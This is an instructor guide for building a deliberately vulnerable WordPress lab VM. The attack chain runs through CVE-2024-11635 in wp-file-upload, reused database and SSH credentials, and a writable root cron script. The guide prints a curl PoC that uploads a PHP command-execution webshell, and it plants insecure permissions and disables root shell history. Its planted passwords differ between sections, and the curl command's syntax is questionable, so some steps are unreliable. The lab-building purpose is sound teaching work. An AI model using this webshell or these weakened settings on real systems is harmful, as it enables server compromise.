![[medium1_attack_chain.png]]
### Part 1 — Base OS install and hardening

**Goal:** A clean, minimal Debian 12 VM that behaves like a real server, not a CTF toy.

**Tasks:**

Install Debian 12 Bookworm (netinstall ISO). During setup: no desktop environment, no SSH server pre-installed (you'll configure it manually), standard system utilities only. Allocate 20 GB disk, 2 GB RAM — enough that the CMS and MySQL run comfortably.

Post-install configuration. Set hostname to something neutral like `webserver` or `cms-prod`. Configure a static IP on the host-only or NAT adapter so the student's attacking machine always reaches it at the same address. Set timezone to UTC.

Create user accounts deliberately. You need exactly three accounts with specific purposes: `www-data` (already exists, used by Apache), a regular Linux user such as `developer` whose password reuses the DB credential you'll plant in Part 3, and `root`. Do not create any other users. Lock the `root` password for SSH but keep `su` working locally.

Install only what the challenge needs: `apache2`, `php8.2` plus common extensions (`php8.2-mysql`, `php8.2-curl`, `php8.2-gd`, `php8.2-xml`, `php8.2-mbstring`, `php8.2-zip`), `mysql-server`, `openssh-server`, `curl`, `wget`, `unzip`, `cron`. Nothing else. No compilers, no python3-pip, no netcat by default — the student should carry their own tools or use what's already on the box through the webshell.

Firewall with `ufw`: allow port 22 (SSH) and port 80 (HTTP) inbound. Block everything else. This forces the student to use HTTP for initial access and SSH for the lateral move.

**Verification checkpoint:** SSH in on port 22, confirm Apache serves a default page on port 80, confirm MySQL is running.

# Part 1 — Base OS Install and Hardening

**Goal:** A clean, minimal Debian 12 VM that behaves like a real server, not a CTF toy.

---

## 1. Debian 12 Netinstall — What to Select

Download: https://www.debian.org/distrib/netinst  
Use the **amd64 netinstall ISO**.

### During the installer:

|Setting|Value|
|---|---|
|Hostname|`webserver` (or `cms-prod`)|
|Domain|leave blank|
|Root password|set strong one — you'll lock SSH later|
|New user|`developer`|
|Developer password|**must match** the DB credential you plant in Part 3 (e.g. `Dev@2024!`)|
|Disk|20 GB, guided partitioning, all in one partition|
|RAM|2 GB|

### Software Selection screen (tasksel):

- **Uncheck everything.**
- Leave only **"standard system utilities"** checked.
- No desktop, no SSH server, no web server — you configure all of that manually.

---

## 2. Post-Install Configuration

Run all commands below as **root** (`su -` from developer, or direct root login on console).

### 2a. Hostname

```bash
hostnamectl set-hostname webserver
# Verify
hostname
```

Update `/etc/hosts` so the name resolves locally:

```bash
sed -i 's/^127\.0\.1\.1.*/127.0.1.1\twebserver/' /etc/hosts
```

### 2b. Static IP (Host-Only / NAT adapter)

Find your interface name first:

```bash
ip link show
# Usually: eth0, ens33, enp0s3 — note it down
```

Edit the network config:

```bash
nano /etc/network/interfaces
```

Replace or add the relevant stanza (substitute `eth0` with your actual interface):

```
# The primary network interface
auto enp0s3
iface enp0s3 inet static
    address 192.168.56.10
    netmask 255.255.255.0
    gateway 192.168.56.1
```

> **Note:** `192.168.56.0/24` is the default VirtualBox host-only range.  
> For VMware host-only, use `192.168.136.0/24` or check your VMnet adapter.  
> Adjust the IP to whatever your lab uses — just keep it fixed.

Apply:

```bash
systemctl restart networking
ip addr show enp0s3
```

### 2c. Timezone to UTC

```bash
timedatectl set-timezone UTC
timedatectl status   # confirm
```

---

## 3. User Accounts

The machine must have **exactly three accounts**:

|Account|Purpose|Notes|
|---|---|---|
|`root`|System root|SSH login blocked; `su` works locally|
|`developer`|Regular Linux user|Password deliberately reuses DB credential (set in Part 3)|
|`www-data`|Apache process user|Already exists; do not touch|

### Verify developer exists (created during install):

```bash
id developer
```

If you skipped creating it during install:

```bash
useradd -m -s /bin/bash developer
passwd developer       # set the same password as your DB credential
```

### Add developer to sudo (optional — depends on how hard you want privilege escalation):

```bash
# If you want sudo as a path for privesc, add them but don't tell the student:
usermod -aG sudo developer

# If you want a harder box, skip sudo entirely — leave them with only su
```

### Confirm no extra users exist:

```bash
awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd
# Should output only: developer
```

---

## 4. Install Required Packages Only

```bash
apt update && apt upgrade -y

apt install -y \
  apache2 \
  php8.2 \
  php8.2-mysql \
  php8.2-curl \
  php8.2-gd \
  php8.2-xml \
  php8.2-mbstring \
  php8.2-zip \
  mysql-server \
  openssh-server \
  curl \
  wget \
  unzip \
  cron

# Enable and start services
systemctl enable apache2 mysql ssh cron
systemctl start  apache2 mysql ssh cron
```

### Explicitly confirm no compilers or extras:

```bash
# These should NOT be installed. Verify:
which gcc   || echo "gcc absent — good"
which python3 || echo "python3 absent — good"
which nc    || echo "nc absent — good"
which pip3  || echo "pip3 absent — good"
```

> If any appear (some come via dependency), remove them:
> 
> ```bash
> apt remove --purge gcc python3 netcat-traditional -y
> apt autoremove -y
> ```

---

## 5. Firewall with UFW

```bash
apt install -y ufw

# Set defaults: deny all inbound, allow all outbound
ufw default deny incoming
ufw default allow outgoing

# Allow SSH and HTTP only
ufw allow 22/tcp comment 'SSH'
ufw allow 80/tcp comment 'HTTP'

# Enable (will prompt for confirmation)
ufw --force enable

# Verify rules
ufw status verbose
```

Expected output:

```
Status: active
To                         Action      From
--                         ------      ----
22/tcp                     ALLOW IN    Anywhere
80/tcp                     ALLOW IN    Anywhere
```

---

## 6. Lock Root SSH Login

Edit the SSH daemon config:

```bash
nano /etc/ssh/sshd_config
```

Set or confirm these lines:

```
PermitRootLogin no
PasswordAuthentication yes
```

Restart SSH:

```bash
systemctl restart ssh
```

> Root is now blocked from SSH. Students log in as `developer`, then `su -` to escalate locally — or use the webshell → privesc path.

---

## 7. Optional Hardening (Realistic Server Feel)

These small touches make the box feel like a real server that got lazy rather than a CTF setup:

```bash
# Set a login banner (misdirection / realism)
echo "Unauthorized access is prohibited. All sessions are logged." > /etc/motd

# Disable bash history for root (remove forensic artifacts)
echo "HISTSIZE=0" >> /root/.bashrc
echo "HISTFILESIZE=0" >> /root/.bashrc

# Ensure cron is running (used by the CMS in later parts)
systemctl enable cron
```

---

## 8. Verification Checkpoint

Run each check and confirm it passes before moving to Part 2.

```bash
# --- CHECK 1: SSH is accessible ---
# From your attacking machine:
ssh developer@192.168.56.10
# Should prompt for password, log in successfully

# --- CHECK 2: Apache serves default page ---
curl -I http://192.168.56.10
# Expected: HTTP/1.1 200 OK
# Also open in browser: http://192.168.56.10 → Debian Apache2 Default Page

# --- CHECK 3: MySQL is running ---
systemctl status mysql | grep "active (running)"
# Or:
mysql -u root -e "SELECT 1;"
# Expected: returns 1

# --- CHECK 4: UFW is active and correct ---
ufw status verbose

# --- CHECK 5: No unwanted users ---
awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd

# --- CHECK 6: Root SSH is blocked ---
# From attacking machine:
ssh root@192.168.56.10
# Expected: "Permission denied" or "not allowed"

# --- CHECK 7: PHP is installed ---
php8.2 --version
# Expected: PHP 8.2.x (cli)

# --- CHECK 8: No compilers ---
which gcc python3 pip3 nc 2>/dev/null || echo "Clean — none found"
```

---

## Quick Summary — What You've Built

```
VM: Debian 12 Bookworm
IP: 192.168.56.10 (static, host-only)
Hostname: webserver
Timezone: UTC

Users:
  root        → local only (SSH blocked)
  developer   → SSH allowed, password = DB credential (planted in Part 3)
  www-data    → Apache process user (untouched)

Services running:
  apache2 (port 80)
  mysql   (port 3306, loopback only)
  sshd    (port 22)
  cron

Firewall:
  ALLOW  tcp/22   (SSH)
  ALLOW  tcp/80   (HTTP)
  DENY   everything else

Not installed:
  gcc, python3, pip3, netcat, compilers
```

**Part 1 complete. Proceed to Part 2 — CMS installation and misconfiguration.**

---

## Automation Script

Save this as `part1_setup.sh` and run it as root **after** the base Debian install completes. It handles everything from Section 2 onwards.

```bash
#!/bin/bash
# part1_setup.sh — Post-install hardening for CTF lab server (Part 1)
# Run as root after clean Debian 12 netinstall

set -euo pipefail

IFACE="eth0"          # Change if your interface is ens33, enp0s3, etc.
STATIC_IP="192.168.56.10"
GATEWAY="192.168.56.1"
HOSTNAME="webserver"
DEV_USER="developer"
DEV_PASS="Dev@2024!"  # MUST match DB credential planted in Part 3

echo "[*] Setting hostname..."
hostnamectl set-hostname "$HOSTNAME"
sed -i "s/^127\.0\.1\.1.*/127.0.1.1\t$HOSTNAME/" /etc/hosts

echo "[*] Setting timezone to UTC..."
timedatectl set-timezone UTC

echo "[*] Configuring static IP on $IFACE..."
cat >> /etc/network/interfaces <<EOF

auto $IFACE
iface $IFACE inet static
    address $STATIC_IP
    netmask 255.255.255.0
    gateway $GATEWAY
EOF

echo "[*] Installing packages..."
apt update -qq
apt install -y \
  apache2 \
  php8.2 php8.2-mysql php8.2-curl php8.2-gd php8.2-xml php8.2-mbstring php8.2-zip \
  mysql-server \
  openssh-server \
  curl wget unzip cron ufw

echo "[*] Enabling services..."
systemctl enable apache2 mysql ssh cron
systemctl start  apache2 mysql ssh cron

echo "[*] Ensuring developer user exists with correct password..."
if ! id "$DEV_USER" &>/dev/null; then
  useradd -m -s /bin/bash "$DEV_USER"
fi
echo "$DEV_USER:$DEV_PASS" | chpasswd

echo "[*] Configuring SSH (block root login)..."
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
systemctl restart ssh

echo "[*] Configuring UFW firewall..."
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp comment 'SSH'
ufw allow 80/tcp comment 'HTTP'
ufw --force enable

echo "[*] Setting login banner..."
echo "Unauthorized access is prohibited. All sessions are logged." > /etc/motd

echo ""
echo "============================================"
echo " Part 1 setup complete."
echo " Static IP: $STATIC_IP"
echo " SSH: developer / $DEV_PASS"
echo " Apache: http://$STATIC_IP"
echo " Run verification checks before Part 2."
echo "============================================"
```

---

### Part 2 — CVE selection and vulnerable plugin installation

**Goal:** Pin an exact, real CVE to a specific WordPress plugin version so students can do genuine CVE research.

**Tasks:**

CVE research and selection. Search NVD at `https://nvd.nist.gov/vuln/search` with the query `WordPress plugin arbitrary file upload` filtered to 2024–2025. A strong candidate class is plugins that accept file uploads without verifying MIME type or extension server-side. Good historical examples to search for include plugins in the gallery, form-builder, or media-management categories. Pick one where the CVE description explicitly states "unauthenticated" and "arbitrary file upload" — this is the exact primitive you need. Record the CVE number, the affected plugin slug, and the vulnerable version number.

Download the exact vulnerable version. WordPress.org keeps old plugin versions at `https://downloads.wordpress.org/plugin/<slug>.<version>.zip`. Download this and store it offline — WordPress.org occasionally removes vulnerable versions. You will install this ZIP manually rather than through the admin panel to lock in the version.

Install WordPress itself. Use the latest stable WordPress core (security patches on the core don't affect your chosen plugin vuln). Install it under `/var/www/html` with Apache's `DocumentRoot` pointing there. Run the 5-minute install against your MySQL database.

Install and freeze the vulnerable plugin. Upload and activate the plugin ZIP. Then, critically, disable WordPress automatic updates entirely by adding `define('AUTOMATIC_UPDATER_DISABLED', true);` and `define('WP_AUTO_UPDATE_CORE', false);` to `wp-config.php`. Also set file permissions so WordPress cannot auto-update the plugin: `chmod 555 /var/www/html/wp-content/plugins/<your-plugin-slug>/`.

Set WordPress file upload directory permissions so the exploit actually works. The vulnerable plugin will try to write a file to `wp-content/uploads/` or a plugin-specific subdirectory. Confirm `www-data` owns and can write to that path: `chown -R www-data:www-data /var/www/html/wp-content/uploads && chmod -R 755 /var/www/html/wp-content/uploads`.

**Verification checkpoint:** Confirm the plugin is active in the WordPress admin panel. Run the public PoC for the CVE against your own box and confirm a PHP file lands in the expected upload directory. If the PoC requires authentication, check the CVE description again — you want the unauthenticated variant.

# Part 2 — CVE Selection and Vulnerable Plugin Installation

**Goal:** Pin an exact, real CVE to a specific WordPress plugin version. Students do genuine CVE research, find the PoC, and land a webshell with a single curl command.

---

## Selected CVE: CVE-2024-11635

|Field|Value|
|---|---|
|**CVE ID**|CVE-2024-11635|
|**Plugin name**|WordPress File Upload|
|**Plugin slug**|`wp-file-upload`|
|**Vulnerable versions**|All versions up to and including **4.24.12**|
|**Patched in**|4.24.13+|
|**CVSS Score**|10.0 (Critical)|
|**Primitive**|Unauthenticated Remote Code Execution via arbitrary file upload|
|**No external account required**|✅ Works fully offline / air-gapped|
|**NVD link**|https://nvd.nist.gov/vuln/detail/CVE-2024-11635|
|**Wordfence advisory**|https://www.wordfence.com/threat-intel/vulnerabilities/id/b5165f60-6515-4a2c-a124-cc88155eaf01|
|**Researcher PoC**|https://abrahack.com/posts/wp-file-upload-rce-part1/|

### Why this CVE for a lab?

- Explicitly **unauthenticated** — no login required whatsoever
- No dependency on external SaaS accounts or cloud storage (unlike CVE-2024-8856)
- The plugin is designed to accept user file uploads from public pages — it's the entire point of the plugin — making the misconfiguration completely believable for a "real" WordPress site
- Public PoC and a Metasploit module exist, so students can research it properly on NVD/Wordfence/ExploitDB
- The attack chain: POST a `.php` file via the AJAX upload hook → visit the uploaded path → RCE
- The fix (removing cookie-based path input) is educational — students can read the patch diff on the WordPress SVN and understand exactly what changed

### The vulnerability (so you understand what you're building):

The plugin's `wfu_file_downloader.php` reads a file path from the `wfu_ABSPATH` cookie parameter without authentication. Combined with the `wfu_ajax_action` AJAX hook that allows unauthenticated file uploads, an attacker can:

1. Upload a PHP webshell as a `.json` file via the public-facing AJAX endpoint
2. Use the cookie-based path traversal to load and execute it

No WordPress account, no session token, no bruteforce — one `curl` command each step.

---

## Task 1: Download the Exact Vulnerable Version

On your **lab host** (the machine with internet — not the target VM), run:

```bash
# The exact vulnerable version to pin
wget https://downloads.wordpress.org/plugin/wp-file-upload.4.24.12.zip

# Verify download
ls -lh wp-file-upload.4.24.12.zip
# Expected: ~800KB zip file

# Store it offline — keep this copy
cp wp-file-upload.4.24.12.zip ~/lab-assets/
```

> **Important:** WordPress.org does occasionally remove vulnerable plugin versions. Keep this offline copy. If the direct URL 404s, the Internet Archive mirror is: `https://web.archive.org/web/*/https://downloads.wordpress.org/plugin/wp-file-upload.4.24.12.zip`

Transfer the ZIP to your target VM:

```bash
scp wp-file-upload.4.24.12.zip developer@192.168.56.10:/tmp/
```

---

## Task 2: Install WordPress Core

Run all commands below as **root** on the target VM (`su -` from developer).

### 2a. Create the MySQL database and user

```bash
mysql -u root <<'SQL'
CREATE DATABASE wordpress DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER 'wpuser'@'localhost' IDENTIFIED BY 'Dev@2024!';
GRANT ALL PRIVILEGES ON wordpress.* TO 'wpuser'@'localhost';
FLUSH PRIVILEGES;
SQL
```

> The DB password `Dev@2024!` deliberately matches the `developer` OS account password — this is the credential reuse that connects Part 3's lateral move. Plant it once here, and keep it consistent.

### 2b. Download and extract WordPress core

```bash
cd /tmp
wget https://wordpress.org/latest.tar.gz
tar xzf latest.tar.gz

# Clear the default Apache DocumentRoot and install WordPress there
rm -rf /var/www/html/*
cp -a wordpress/. /var/www/html/
```

### 2c. Configure wp-config.php

```bash
cd /var/www/html
cp wp-config-sample.php wp-config.php

# Set DB credentials
sed -i "s/database_name_here/wordpress/" wp-config.php
sed -i "s/username_here/wpuser/" wp-config.php
sed -i "s/password_here/Dev@2024!/" wp-config.php
sed -i "s/localhost/localhost/" wp-config.php
```

Generate fresh secret keys (do this from your host, or use the API):

```bash
# Fetch fresh unique keys from the WordPress API
KEYS=$(curl -s https://api.wordpress.org/secret-key/1.1/salt/)
# Paste the output into wp-config.php replacing the placeholder block:
# (the 8 lines starting with define('AUTH_KEY' through define('LOGGED_IN_SALT'...)
# Edit manually: nano /var/www/html/wp-config.php
```

Or, for a lab where uniqueness doesn't matter, just leave the placeholder keys — they only affect cookie security.

### 2d. Add update-freeze and file permission lock to wp-config.php

Add these lines **immediately after** the DB settings block in `wp-config.php`:

```bash
cat >> /var/www/html/wp-config.php <<'PHP'

// === LAB: Freeze all auto-updates ===
define('AUTOMATIC_UPDATER_DISABLED', true);
define('WP_AUTO_UPDATE_CORE', false);
define('DISALLOW_FILE_MODS', false);  // keep true later if you want to block admin uploads too
PHP
```

### 2e. Set file ownership

```bash
chown -R www-data:www-data /var/www/html/
find /var/www/html/ -type d -exec chmod 755 {} \;
find /var/www/html/ -type f -exec chmod 644 {} \;
```

### 2f. Run the 5-minute WordPress install

Open a browser on your host machine and navigate to:

```
http://192.168.56.10/wp-admin/install.php
```

Fill in:

| Field                    | Value                                       |
| ------------------------ | ------------------------------------------- |
| Site Title               | `CMS Demo` (or anything neutral)            |
| Username                 | `admin`                                     |
| Password                 | Admin@123!!@#                               |
| Email                    | `admin@localhost.local`                     |
| Search engine visibility | **Check "Discourage"** (no crawling needed) |

Click **Install WordPress**. Login at `http://192.168.56.10/wp-admin/`.

---

## Task 3: Install and Freeze the Vulnerable Plugin

### 3a. Install via WP-CLI or file copy (NOT through the admin uploader)

Installing via file copy locks in the exact version with no auto-selection:

```bash
cd /var/www/html/wp-content/plugins/
unzip /tmp/wp-file-upload.4.24.12.zip
chown -R www-data:www-data wp-file-upload/
```

### 3b. Activate via WP-CLI (optional but cleaner than clicking through admin)

```bash
# Install WP-CLI first
curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
chmod +x wp-cli.phar
mv wp-cli.phar /usr/local/bin/wp

# Activate the plugin
wp --allow-root --path=/var/www/html plugin activate wp-file-upload
```

Or activate it manually: WordPress Admin → Plugins → find "WordPress File Upload" → Activate.

### 3c. Create a page that uses the upload shortcode

The plugin needs to be embedded on a public page for the upload hook to be active. In WP Admin:

1. Pages → Add New
2. Title: `Upload`
3. In the content, add: `[wordpress_file_upload]`
4. Publish it

This creates `http://192.168.56.10/?page_id=X` with a public file upload form — which is what makes the vulnerability reachable unauthenticated.

### 3d. Freeze the plugin version with chmod

```bash
# Lock the plugin directory so WordPress cannot auto-update it
chmod 555 /var/www/html/wp-content/plugins/wp-file-upload/

# Verify
ls -la /var/www/html/wp-content/plugins/ | grep wp-file-upload
# Expected: dr-xr-xr-x  (no write bit)
```

---

## Task 4: Set Upload Directory Permissions

The webshell lands in `wp-content/uploads/` (or a plugin subdirectory). Make sure `www-data` can write there:

```bash
# Ensure uploads directory exists and is writable by Apache
mkdir -p /var/www/html/wp-content/uploads
chown -R www-data:www-data /var/www/html/wp-content/uploads
chmod -R 755 /var/www/html/wp-content/uploads

# Verify
ls -la /var/www/html/wp-content/ | grep uploads
# Expected: drwxr-xr-x ... www-data www-data ... uploads
```

---

## Task 5: Verification Checkpoint

### Check 1 — Plugin is active in admin panel

Log into `http://192.168.56.10/wp-admin/` → Plugins → confirm "WordPress File Upload" shows **Active** with version **4.24.12**.

### Check 2 — Upload form is publicly accessible (no login)

```bash
# From your attacking machine (no cookies, no session):
curl -s http://192.168.56.10/?page_id=2 | grep -i "upload"
# Should see the upload form HTML
```

### Check 3 — Run the PoC against your own box

This is your lab verification — confirm the vulnerability is live before presenting the challenge to a student.

```bash
# Step 1: Upload a PHP webshell disguised as a JSON file via the unauthenticated AJAX hook
# The wfu_ajax_action hook accepts files from unauthenticated users

SHELL_CONTENT='<?php system($_GET["cmd"]); ?>'
TARGET="http://192.168.56.10"

curl -s -X POST \
  "${TARGET}/wp-admin/admin-ajax.php" \
  -F "action=wfu_ajax_action" \
  -F "wfu_uploader=wfu_uploader_1" \
  -F "wfu_unique_id=1234" \
  -F "wfu_files[]=@-;filename=shell.php;type=application/json" \
  --data-binary "${SHELL_CONTENT}"
```

> **Note:** The exact upload request format depends on the plugin's shortcode configuration and nonce handling. Some versions require a nonce from the page — if blocked, grab it first:
> 
> ```bash
> NONCE=$(curl -s "${TARGET}/?page_id=2" | grep -oP 'wfu_nonce[^"]*"[^"]*"\s*:\s*"\K[^"]+')
> # Then include -F "wfu_nonce=${NONCE}" in the upload request
> ```

```bash
# Step 2: Execute the uploaded shell
# The file lands in wp-content/uploads/ — find it:
curl -s "${TARGET}/wp-content/uploads/shell.php?cmd=id"
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

If you see `uid=33(www-data)` — **Part 2 is complete.** The webshell is live.

---

## Automation Script

Save as `part2_setup.sh` and run as root after Part 1 is complete. Assumes `wp-file-upload.4.24.12.zip` has already been copied to `/tmp/`.

```bash
#!/bin/bash
# part2_setup.sh — WordPress + vulnerable plugin install for CTF lab (Part 2)
# Run as root. Assumes Part 1 complete and /tmp/wp-file-upload.4.24.12.zip present.

set -euo pipefail

WP_DIR="/var/www/html"
DB_NAME="wordpress"
DB_USER="wpuser"
DB_PASS="Dev@2024!"       # MUST match developer OS account password
PLUGIN_ZIP="/tmp/wp-file-upload.4.24.12.zip"

echo "[*] Creating MySQL database and user..."
mysql -u root <<SQL
CREATE DATABASE IF NOT EXISTS ${DB_NAME} DEFAULT CHARACTER SET utf8mb4;
CREATE USER IF NOT EXISTS '${DB_USER}'@'localhost' IDENTIFIED BY '${DB_PASS}';
GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'localhost';
FLUSH PRIVILEGES;
SQL

echo "[*] Downloading WordPress core..."
cd /tmp
wget -q https://wordpress.org/latest.tar.gz
tar xzf latest.tar.gz

echo "[*] Installing WordPress to ${WP_DIR}..."
rm -rf ${WP_DIR}/*
cp -a wordpress/. ${WP_DIR}/

echo "[*] Configuring wp-config.php..."
cd ${WP_DIR}
cp wp-config-sample.php wp-config.php
sed -i "s/database_name_here/${DB_NAME}/" wp-config.php
sed -i "s/username_here/${DB_USER}/" wp-config.php
sed -i "s/password_here/${DB_PASS}/" wp-config.php

cat >> wp-config.php <<PHP

// LAB: Freeze all auto-updates
define('AUTOMATIC_UPDATER_DISABLED', true);
define('WP_AUTO_UPDATE_CORE', false);
PHP

echo "[*] Installing vulnerable plugin (wp-file-upload 4.24.12)..."
cd ${WP_DIR}/wp-content/plugins/
unzip -q ${PLUGIN_ZIP}

echo "[*] Setting file permissions..."
chown -R www-data:www-data ${WP_DIR}
find ${WP_DIR} -type d -exec chmod 755 {} \;
find ${WP_DIR} -type f -exec chmod 644 {} \;

# Lock plugin against auto-update
chmod 555 ${WP_DIR}/wp-content/plugins/wp-file-upload/

# Ensure uploads directory is writable
mkdir -p ${WP_DIR}/wp-content/uploads
chown -R www-data:www-data ${WP_DIR}/wp-content/uploads
chmod -R 755 ${WP_DIR}/wp-content/uploads

echo "[*] Installing WP-CLI..."
curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
chmod +x wp-cli.phar
mv wp-cli.phar /usr/local/bin/wp

echo ""
echo "============================================"
echo " Part 2 setup complete."
echo ""
echo " Next: Complete the 5-minute install at:"
echo "   http://192.168.56.10/wp-admin/install.php"
echo ""
echo " Then activate the plugin and create an"
echo " 'Upload' page with shortcode: [wordpress_file_upload]"
echo ""
echo " CVE: CVE-2024-11635"
echo " Plugin: wp-file-upload 4.24.12"
echo " NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-11635"
echo "============================================"
```

---

## What Students Should Research

When you present this to students, give them only:

- The IP address of the box
- The hint: "There is a WordPress plugin installed. Find the CVE."

Expected research path:

1. Run `whatweb` or browse the site → identify WordPress
2. Use `wpscan --url http://192.168.56.10 --enumerate p` → finds `wp-file-upload` version `4.24.12`
3. Search NVD / Wordfence for `wp-file-upload 4.24.12` → finds CVE-2024-11635
4. Read the researcher writeup at abrahack.com or the GitHub PoC
5. Adapt and run the exploit → webshell as `www-data`

---

## State Summary After Part 2

```
WordPress:      /var/www/html (latest core, DB: wordpress / wpuser / Dev@2024!)
Plugin:         wp-file-upload 4.24.12 — ACTIVE, auto-update LOCKED
CVE:            CVE-2024-11635 (Unauthenticated RCE, CVSS 10.0)
Exploit path:   POST to /wp-admin/admin-ajax.php → shell in /wp-content/uploads/
Upload perms:   www-data owns wp-content/uploads/, chmod 755
WP Admin:       http://192.168.56.10/wp-admin/ (admin / <your-strong-password>)

Attack chain so far:
  [Student] → HTTP port 80 → CVE-2024-11635 → webshell as www-data
  [Next: Part 3] → credential in wp-config.php → su developer → privesc to root
```

**Part 2 complete. Proceed to Part 3 — credential planting and privilege escalation path.**

---

### Part 3 — Credential chain setup

**Goal:** Plant a believable credential reuse path from the CMS database to a real Linux account.

**Tasks:**

Choose a password that looks plausible but is not in the top-1000 rockyou list. Something like `S3cur3Dev2024!` — mixed case, number, symbol, looks like a developer made it. This is the shared secret that bridges the web tier to the OS tier.

Configure WordPress with this password. During the WordPress install wizard, set the database name to `wordpress`, database user to `wpuser`, and database password to your chosen credential. This creates the entry in `wp-config.php`. The relevant lines will read:

```
define( 'DB_PASSWORD', 'S3cur3Dev2024!' );
```

Create the MySQL user with that same password: `CREATE USER 'wpuser'@'localhost' IDENTIFIED BY 'S3cur3Dev2024!';` then grant it access only to the wordpress database.

Create the Linux account with the same password. `useradd -m -s /bin/bash developer`, then `echo 'developer:S3cur3Dev2024!' | chpasswd`. Enable password authentication for SSH (`PasswordAuthentication yes` in `/etc/ssh/sshd_config`), restart SSH. This is intentionally insecure — the lesson is credential reuse.

Seed the database `users` table with a convincing record. In the `wp_users` table, there is already a WordPress admin account. Make sure the admin username is something realistic like `admin` or `webmaster`. The student will find the hashed password in the DB — you do not need the hash to be crackable; the lesson is reading `wp-config.php` for the DB password and then trying that same plaintext against SSH, not cracking the WordPress hash.

**Verification checkpoint:** From the VM itself, confirm `mysql -u wpuser -pS3cur3Dev2024! wordpress` works. From the attacking machine, confirm `ssh developer@<VM-IP>` with password `S3cur3Dev2024!` succeeds.

---

### Part 4 — Cron privesc setup

**Goal:** Plant a root cron job that calls a script writable by `www-data`'s group, creating a deterministic, exploitable privesc path.

**Tasks:**

Create the scripts directory and the target script. As root:

bash

```bash
mkdir -p /opt/scripts
cat > /opt/scripts/cleanup.sh << 'EOF'
#!/bin/bash
find /tmp -type f -mtime +1 -delete
find /var/log -name "*.gz" -mtime +7 -delete
EOF
chmod 750 /opt/scripts/cleanup.sh
chown root:www-data /opt/scripts/cleanup.sh
```

The key permission decision: `chmod 750` with group `www-data` means the owner (root) has full access, the group (`www-data`) has read and execute but not write, and others have nothing. Then change it to `chmod 770` — this makes the script writable by anyone in the `www-data` group. This is the deliberate vulnerability. Both `www-data` (Apache's process user) and `developer` should be in the `www-data` group: `usermod -aG www-data developer`.

Install the root cron job. `crontab -e` as root, add:

```
*/5 * * * * /bin/bash /opt/scripts/cleanup.sh
```

Confirm the script looks realistic — actual cleanup logic makes it blend in if a student runs `cat` on it before understanding the permissions.

Set the directory permissions carefully. `/opt/scripts/` should be owned by `root:root` with `chmod 755` — the student cannot add new scripts to the directory, only modify the existing one. This keeps the attack path specific.

Plant a small misdirection. Create `/opt/scripts/backup.sh` owned `root:root` with `chmod 700`. Students who enumerate `/opt/scripts/` with `ls -la` will see both scripts, but only `cleanup.sh` is exploitable. This rewards careful `pspy` or `ls -la` analysis over guessing.

**Verification checkpoint:** As the `www-data` user (`su -s /bin/bash www-data`), confirm you can write to `cleanup.sh`: `echo "# test" >> /opt/scripts/cleanup.sh` should succeed. As `developer`, same test. Then `crontab -l` as root to confirm the job is installed. Wait up to 5 minutes and confirm `/tmp` cleanup happens — the cron job actually runs.

---

### Part 5 — Enumeration surface tuning

**Goal:** Make sure the box rewards standard methodology — nmap, gobuster, wpscan, linpeas — and does not accidentally give away the answer or block the tools.

**Tasks:**

Ensure the WordPress version is visible in page source (default behavior — do not hide it). Students should be able to `curl http://<IP>/` and find `?ver=` parameters revealing the WordPress version, which seeds their plugin enumeration.

Expose plugin version strings. The vulnerable plugin's version should appear in its `readme.txt` at `http://<IP>/wp-content/plugins/<slug>/readme.txt`. This is the standard WPScan detection vector. Do not delete or modify this file.

Enable WordPress XML-RPC (`/xmlrpc.php`) — it's enabled by default and gives students an extra enumeration path that goes nowhere, teaching them to stay focused.

Put a robots.txt red herring. Add a `/robots.txt` that disallows `/wp-admin/` and `/wp-content/` — this teaches students that `robots.txt` reveals interesting paths even when trying to hide them.

Leave `/wp-content/uploads/` browseable (no Apache directory listing — keep `Options -Indexes` — but ensure the uploaded webshell is directly accessible by URL once placed). The student's webshell access depends on Apache serving PHP files from the uploads directory. Confirm `php` files in `wp-content/uploads/` are executed rather than downloaded: this requires that `wp-content/uploads/` not have a `.htaccess` blocking PHP execution. WordPress often adds such a file — check and remove it if present.

**Verification checkpoint:** Run `wpscan --url http://<VM-IP>/ --enumerate p` from your attacking machine and confirm the vulnerable plugin and its version appear in output. Confirm `curl http://<VM-IP>/wp-content/plugins/<slug>/readme.txt` returns version information.

---

### Part 6 — Flag placement

**Goal:** Give students clear, unambiguous proof-of-exploitation at each stage.

**Tasks:**

Place four flags, one per stage:

`/var/www/html/wp-content/uploads/flag1.txt` — readable by `www-data`. Content: `FLAG{FOOTHOLD_RCE_ACHIEVED}`. Students reach this after getting their webshell.

`/home/developer/flag2.txt` — readable only by `developer` and root. Content: `FLAG{CRED_REUSE_PIVOT}`. Students reach this after SSH-ing in as `developer`.

`/opt/scripts/flag3.txt` — readable by `www-data` group. Content: `FLAG{CRON_SCRIPT_IDENTIFIED}`. Students find this while enumerating the cron target.

`/root/flag4.txt` — readable only by root. Content: `FLAG{ROOT_OWNED}`. The final prize.

Set permissions explicitly: `chmod 640 /home/developer/flag2.txt && chown developer:developer /home/developer/flag2.txt`, and so on for each flag.

---

### Part 7 — Snapshot, documentation, and distribution

**Goal:** Package the VM so it can be handed to students cleanly.

**Tasks:**

Take a clean snapshot before any student touches it. In VirtualBox or VMware, snapshot the VM in its pristine state. Name it `clean-state`. If a student bricks it, you restore from here.

Write the student-facing challenge brief. It should contain: the IP address of the VM, the instruction to start with enumeration only, and the four flag locations (not their contents). Do not hint at the CVE, the plugin, or the privesc vector.

Write the instructor solution guide separately. It should contain: the exact CVE number and PoC command, the exact exploit path step by step, expected tool output at each stage (nmap output, wpscan output, webshell URL, `wp-config.php` grep, SSH command, `pspy` cron detection output, the script edit, and the root shell confirmation).

